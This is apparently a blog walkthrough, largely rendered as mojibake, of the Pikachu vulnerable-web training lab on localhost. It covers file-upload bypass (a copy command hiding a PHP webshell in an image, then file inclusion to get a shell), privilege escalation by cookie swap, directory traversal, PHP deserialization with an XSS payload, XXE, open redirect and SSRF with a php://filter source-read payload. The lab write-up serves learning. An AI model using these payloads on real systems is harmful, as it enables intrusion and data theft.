<p>ä¿®æ”¹åå³å¯ä¸‹è½½</p>
<p><img src="https://img.vim-cn.com/76/fbba66d802377861c21a1b600adb1a423c0c1d.png"></p>
<h1 id="Unsafe-fileupload"><a href="#Unsafe-fileupload" class="headerlink" title="Unsafe fileupload"></a>Unsafe fileupload</h1><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p><img src="https://img.vim-cn.com/2f/c24c1abbd398499ecb192f00724d6d3da000f3.png"></p>
<p>ç›´æ¥ä¸Šä¼ ä¸æˆåŠŸï¼Œæ ¹æ®åç§°çŒœæµ‹æ˜¯å‰ç«¯é™åˆ¶ï¼Œç¦ç”¨å‰ç«¯js</p>
<p><img src="https://img.vim-cn.com/38/17aa302884396e7447d6e9d8608c3587ec22c3.png"></p>
<p>å†æ¬¡å°è¯•ä¸Šä¼ </p>
<p><img src="https://img.vim-cn.com/a3/81bbb500bb969b2afda3f422e52b3f02e40bbf.png"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://img.vim-cn.com/46/ed7136a521540a4689ede9361b66d547983d02.png"></p>
<h2 id="Mime-type"><a href="#Mime-type" class="headerlink" title="Mime type"></a>Mime type</h2><p>æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹å³å¯</p>
<p><img src="https://img.vim-cn.com/56/ef276966936cb8da8ed5b4210f4432e57398bf.png"></p>
<p>æ”¾åŒ…</p>
<p><img src="https://img.vim-cn.com/04/e3cf0031666248e109f0d271a65d01d0e9ae87.png"></p>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p><a href="https://www.cnblogs.com/andr01la/p/5146422.html">å…³äºcopy</a></p>
<p>å¯åˆ©ç”¨windowsç³»ç»Ÿå‘½ä»¤ <code>copy</code> å°†ä¸€æ®µphpæ’å…¥åˆ°å›¾ç‰‡é‡Œè¾¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 2.jpg&#x2F;b+ma.php&#x2F;a 3.jpg</span><br><span class="line"></span><br><span class="line">æŠŠma.php æ’å…¥åˆ° 2.jpgä¸­ è¦†ç›–3.jpg</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸Šä¼ å›¾åƒæ–‡ä»¶</p>
<p> å› ä¸ºæ‰“å¼€ä¹‹åæ˜¯ä¸ªå›¾ç‰‡ï¼Œæ— æ³•ç›´æ¥åˆ©ç”¨ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«çš„æƒ³æ³•æ¥getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;..&#x2F;..&#x2F;unsafeupload&#x2F;+ç»™å‡ºçš„å›¾ç‰‡è·¯å¾„&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥å³å¯</p>
<h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´</p>
<h2 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h2><p>æ°´å¹³è¶Šæƒ ä»¥ä¸€ä¸ªç”¨æˆ·æ¥è¶Šæƒæ“ä½œå¦ä¸€ä¸ªç”¨æˆ·çš„æ•°æ®</p>
<p>å³ä¸Šè§’æç¤ºç»™äº†3ä¸ªè´¦å·</p>
<p>ä»¥kobeè´¦å·æ°´å¹³è¶Šæƒliliä¸ºä¾‹</p>
<p><img src="https://img.vim-cn.com/ad/a4c0edb59a49ae0129c52e18c9ad242a2de082.png"></p>
<p>ç›´æ¥ä¿®æ”¹ä¸€ä¸‹usernameçš„å€¼å‘ç°è¿”å›liliçš„ä¿¡æ¯</p>
<h2 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tipsï¼šè¿™é‡Œæœ‰ä¸¤ä¸ªç”¨æˆ·admin&#x2F;123456,pikachu&#x2F;000000,adminæ˜¯è¶…çº§boss</span><br></pre></td></tr></table></figure>

<p>é‚£å°±æ˜¯ç”¨pikachuæ¥è¶Šæƒadminäº†</p>
<p>å…ˆç™»å½•pikachuè´¦å·ï¼Œå‘ç°åªæœ‰æŸ¥çœ‹æƒé™</p>
<p><img src="https://img.vim-cn.com/41/0edfe03e10a2708faf7916cbe5f04740f124a0.png"></p>
<p>ç™»é™†adminè´¦å·ï¼Œå‘ç°æœ‰æ·»åŠ ç”¨æˆ·çš„æƒé™ï¼Œæ·»åŠ ä¸€ä¸ªç”¨æˆ·å¹¶æŠ“åŒ…å‘é€è‡³repeateræ¨¡å—</p>
<p>é€€å‡ºadminï¼Œç™»é™†pikachuï¼Œå†æ¬¡æŠ“åŒ…è·å–pikachuçš„cookie</p>
<p>ç™»é™†åå‘ç°äº†åˆšåˆšæ·»åŠ çš„hhhç”¨æˆ·</p>
<p><img src="https://img.vim-cn.com/fa/c52643ea0720586e2673fc70c10f46132d8cc9.png"></p>
<p>è¿™æ—¶è½¬åˆ°bpï¼Œç”¨åˆšåˆšå¤åˆ¶çš„pikachuçš„cookieæ¥æ›¿æ¢adminçš„cookieï¼Œå¹¶ä¿®æ”¹ä¸€ä¸‹ç”¨æˆ·ä¿¡æ¯ï¼Œç‚¹å‡»send</p>
<p>åˆ·æ–°ç•Œé¢å°±å¯ä»¥çœ‹åˆ°æ–°å¢çš„ç”¨æˆ·abcäº†</p>
<p><img src="https://img.vim-cn.com/99/a93fc7fe0b0674f73e2c477b8ab50422eac81c.png"></p>
<h1 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="../../( ç›®å½•éå† )"></a>../../( ç›®å½•éå† )</h1><p><img src="https://img.vim-cn.com/fa/5caf8b25132971c3641b8b470c5b71a60828f9.png"></p>
<p>è§‚å¯Ÿæ¦‚è¿°çš„url</p>
<p><img src="https://img.vim-cn.com/92/381e4d9f45d213954b5ceb553edc33ea2e93f6.png"></p>
<p>ç‚¹å‡»1 å¯ä»¥çœ‹åˆ°å¯¹åº”çš„url</p>
<p>æŠŠtitleçš„å€¼ä¿®æ”¹ä¸º<code>../dir.php</code>å³å¯è½¬åˆ°æ¦‚è¿°ç•Œé¢</p>
<h1 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h1><p>â€”é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;<br>â€”è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;<br>â€”å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;</p>
<h2 id="icanseeyourABC"><a href="#icanseeyourABC" class="headerlink" title="icanseeyourABC"></a>icanseeyourABC</h2><p>å…ˆæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°é‡Œä¸€ä¸ªæ³¨é‡Š</p>
<p><img src="https://img.vim-cn.com/de/f83af66764569764b89669949e237f189a84fc.png"></p>
<h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><p><strong>åºåˆ—åŒ–serialize()</strong><br>åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:            </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> S(); <span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">serialize(<span class="variable">$s</span>); <span class="comment">//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">åºåˆ—åŒ–åå¾—åˆ°çš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">    O:ä»£è¡¨<span class="keyword">object</span></span><br><span class="line">    <span class="number">1</span>:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦</span><br><span class="line">    S:å¯¹è±¡çš„åç§°</span><br><span class="line">    <span class="number">1</span>:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡</span><br><span class="line">    s:æ•°æ®ç±»å‹</span><br><span class="line">    <span class="number">4</span>:å˜é‡åç§°çš„é•¿åº¦</span><br><span class="line">    test:å˜é‡åç§°</span><br><span class="line">    s:æ•°æ®ç±»å‹</span><br><span class="line">    <span class="number">7</span>:å˜é‡å€¼çš„é•¿åº¦</span><br><span class="line">    pikachu:å˜é‡å€¼</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ååºåˆ—åŒ–unserialize()</strong></p>
<p>å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$u</span>=unserialize(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//å¾—åˆ°çš„ç»“æœä¸ºpikachu</span></span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:</span><br><span class="line">__construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span><br><span class="line"></span><br><span class="line">__wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">æ¼æ´ä¸¾ä¾‹:</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>payloadï¼š<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><code>xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</code></p>
<p>å°±æ˜¯â€æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜â€ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</p>
<p>tipsï¼šå…ˆæŠŠXMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ã€æ–‡æ¡£å…ƒç´ è¿™äº›åŸºç¡€çŸ¥è¯†è‡ªå·±çœ‹ä¸€ä¸‹</p>
<p><code>payloadï¼š&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;xxe&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</code></p>
<p><img src="https://img.vim-cn.com/c3/635e0fe9aa8b0a38b868251ad57841094e1702.png"></p>
<h1 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h1><p>æœ‰4ä¸ªè¶…é“¾æ¥</p>
<p><img src="https://img.vim-cn.com/8c/b149c61e557813a7bc2e5e40911f219538b917.png"></p>
<p>å¯ä»¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªçš„urlçš„å€¼ï¼ˆä¿®æ”¹ä¸ºæŸä¸ªç½‘å€çš„urlï¼‰æ¥å®ç°ç½‘é¡µè·³è½¬</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><strong>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</strong></p>
<p>å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯<strong>æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong>,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</p>
<p>â€‹            å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</p>
<p>â€‹            æ•°æ®æµ:æ”»å‡»è€…â€”â€“&gt;æœåŠ¡å™¨â€”-&gt;ç›®æ ‡åœ°å€</p>
<p>â€‹            æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·            </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF( curl )"></a>SSRF( curl )</h2><p><img src="https://img.vim-cn.com/d7/5eac2b9f9c8051751e22667ed1545c31a552e7.png"></p>
<p>ç‚¹å‡»é“¾æ¥</p>
<p><img src="https://img.vim-cn.com/11/00492eb830ce580aca87eb342c41a5267c28cb.png"></p>
<p>ä¿®æ”¹ä¸€ä¸‹urlå³å¯å®ç°è·³è½¬ï¼ˆæ”¹ä¸ºç™¾åº¦çš„åœ°å€</p>
<p><img src="https://img.vim-cn.com/95/d6600cb6eeaf58998dd8dc77194adcc7281ff3.png"></p>
<p>successï¼</p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF( file_get_content )"></a>SSRF( file_get_content )</h2><p>1ã€ä¸ä¸Šä¸€ä¸ªæ–¹æ³•ç›¸åŒ</p>
<p>2ã€ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ªä¿®æ”¹fileå€¼è¯»å–åˆ°ç½‘é¡µæºç </p>
<p><code>payloadï¼š?file=php://filter/read=convert.base64-encode/resource=ssrf.php</code></p>
<p>ä¼šå‘ç°æºç ä»¥base64ç¼–ç çš„å½¢å¼å‡ºç°åœ¨äº†é¡µé¢ä¸‹è¾¹ï¼Œè¿›è¡Œè§£ç å³å¯çœ‹åˆ°æºç ï¼ˆå¤ªé•¿äº†å°±ä¸æ”¾äº†</p>
<hr>
<p>å†æ—¶3å¤©ç»ˆäºå®Œäº‹å„¿äº†ï¼Œä¸€ç›´æŠ½ç©ºåœ¨æè¿™ä¸ªï¼Œè€ƒè™‘æŠŠwebä»ä¸€ä¸ªå¤§æ¡†æ¶ä¸Šæ¥æ•´ä½“çœ‹ä¸€ä¸‹ï¼Œé‡æ–°å¼€å§‹æœ‰ç›®çš„çš„å»å­¦ä¸€ä¸‹ï¼Œé¶åœºå†…çš„éƒ½æ˜¯æ²¡æœ‰è¿‡æ»¤çš„ç®€å•çš„æ¼æ´å¤ç°ï¼Œè¿‡å‡ å¤©ä¼šæ‰¾ä¸€ä¸‹ç›¸å…³æ¯”èµ›é¢˜ç›®æ¥å¤ç°ä¸€ä¸‹ã€‚</p>
]]></content>
      <categories>
        <category>é¶åœºæ¼æ´å¤ç°</category>
        <category>webå­¦ä¹ </category>
      </categories>
  </entry>
</search>
